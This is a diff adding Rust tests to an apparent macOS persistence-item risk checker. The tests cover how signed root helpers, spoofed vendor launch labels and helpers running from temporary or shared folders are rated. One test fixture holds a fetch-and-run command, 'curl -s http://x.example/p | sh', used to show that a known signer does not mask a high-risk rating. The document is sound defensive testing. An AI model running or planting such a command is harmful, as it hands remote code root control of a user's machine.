@@ -351,6 +351,118 @@ fn program_in_a_temp_shared_or_hidden_folder_is_at_least_medium() {
     assert_eq!(explain(&ok).risk, "low");
 }
 
+/// A BTM root helper signed by `developer` with `team`, running `executable`.
+fn btm_daemon(developer: &str, team: &str, executable: &str) -> Item {
+    let mut i = item(
+        "btm",
+        "uid 0: 16.com.example.helper",
+        &[
+            ("type", "legacy daemon (0x10010)"),
+            ("developer", developer),
+            ("team_id", team),
+            ("executable", executable),
+            ("url", "/Library/LaunchDaemons/com.example.helper.plist"),
+        ],
+    );
+    i.team_id = Some(team.into());
+    i
+}
+
+#[test]
+fn root_helper_from_a_known_developer_is_low() {
+    let items = btm::parse(include_str!("fixtures/sfltool-dumpbtm.txt"));
+    let adobe = explain(&items[1]);
+    assert_eq!(
+        (adobe.added_by.as_deref(), adobe.confidence),
+        (Some("Adobe"), Some("known"))
+    );
+    assert_eq!((adobe.risk, adobe.risk_reason), ("low", None));
+
+    // Developer from the signature, team not in the catalog.
+    let helper = explain(&btm_daemon(
+        "Example Corp",
+        "ABCDE12345",
+        "/Library/PrivilegedHelperTools/com.example.helper",
+    ));
+    assert_eq!(helper.confidence, Some("known"));
+    assert_eq!(helper.risk, "low");
+
+    let mut google = item(
+        "launchd",
+        "/Library/LaunchDaemons/com.google.keystone.daemon.plist",
+        &[
+            ("Label", "com.google.keystone.daemon"),
+            ("Program", "/Library/Google/GoogleSoftwareUpdate/ksdaemon"),
+            ("scope", "global daemon"),
+        ],
+    );
+    google.team_id = Some("EQHXZ8M8AV".into());
+    assert_eq!(explain(&google).risk, "low");
+}
+
+#[test]
+fn spoofed_vendor_labels_stay_medium() {
+    for (label, scope, reason) in [
+        (
+            "com.apple.fake",
+            "global daemon",
+            "Runs with full control of your Mac (as root).",
+        ),
+        (
+            "com.adobe.fake",
+            "global daemon",
+            "Runs with full control of your Mac (as root).",
+        ),
+        (
+            "com.adobe.fake",
+            "global agent",
+            "Driftwatch can’t confirm who made this.",
+        ),
+    ] {
+        let e = explain(&item(
+            "launchd",
+            &format!("/Library/LaunchDaemons/{label}.plist"),
+            &[
+                ("Label", label),
+                ("Program", "/Library/Application Support/x/fake"),
+                ("scope", scope),
+            ],
+        ));
+        assert_eq!(e.confidence, Some("likely"), "{label}");
+        assert_eq!(e.risk, "medium", "{label}");
+        assert_eq!(e.risk_reason.as_deref(), Some(reason), "{label}");
+    }
+}
+
+#[test]
+fn known_developer_does_not_hide_other_warnings() {
+    let fetch = explain(&btm_daemon(
+        "Adobe Inc.",
+        "JQ525L2MZD",
+        "/bin/sh -c curl -s http://x.example/p | sh",
+    ));
+    assert_eq!(fetch.confidence, Some("known"));
+    assert_eq!(fetch.risk, "high");
+
+    let temp = explain(&btm_daemon("Adobe Inc.", "JQ525L2MZD", "/tmp/helper"));
+    assert_eq!(temp.risk, "medium");
+    assert!(temp.risk_reason.unwrap().contains("temporary folder"));
+
+    let mut shared = item(
+        "launchd",
+        "/Library/LaunchDaemons/x.plist",
+        &[
+            ("Label", "x"),
+            ("Program", "/Users/Shared/x/helper"),
+            ("scope", "global daemon"),
+        ],
+    );
+    shared.team_id = Some("EQHXZ8M8AV".into());
+    let e = explain(&shared);
+    assert_eq!(e.risk, "medium");
+    assert!(e.risk_reason.unwrap().contains("Shared folder"));
+}
+
 #[test]
 fn unreadable_items_say_what_could_not_be_read_and_what_to_do() {
     let btm = explain(&item(
